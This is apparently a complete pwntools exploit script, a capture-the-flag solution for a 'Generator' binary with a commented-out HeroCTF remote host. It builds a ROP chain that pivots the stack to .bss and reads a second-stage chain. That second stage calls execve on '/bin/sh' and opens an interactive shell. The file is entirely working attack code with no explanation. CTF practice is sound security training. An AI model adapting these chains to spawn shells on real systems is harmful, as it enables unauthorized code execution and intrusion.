from pwn import *

p = process('./Generator')
# p = remote('pwn.heroctf.fr', 8000)

pop_rdi_rsi_rdx = 0x401222
pop_rdx = 0x401224
syscall = 0x401229
xchg_rax_rdx = 0x401226
ret = 0x401380
bss = 0x404e00
leave_ret = 0x40137f
payload = b'yes' + b'a'*6 + p64(bss) + p64(pop_rdx) + p64(0) + p64(xchg_rax_rdx) + p64(pop_rdi_rsi_rdx) + p64(0) + p64(bss) + p64(0xffff) + p64(syscall) + p64(bss) + p64(leave_ret)
p.sendlineafter(b'no) ', payload)

payload = p64(ret) + p64(ret) + p64(pop_rdx) + p64(59) + p64(xchg_rax_rdx) + p64(pop_rdi_rsi_rdx) + p64(0x404e50) + p64(0) + p64(0) + p64(syscall) + b'/bin/sh\x00'
p.sendline(payload)

p.interactive()
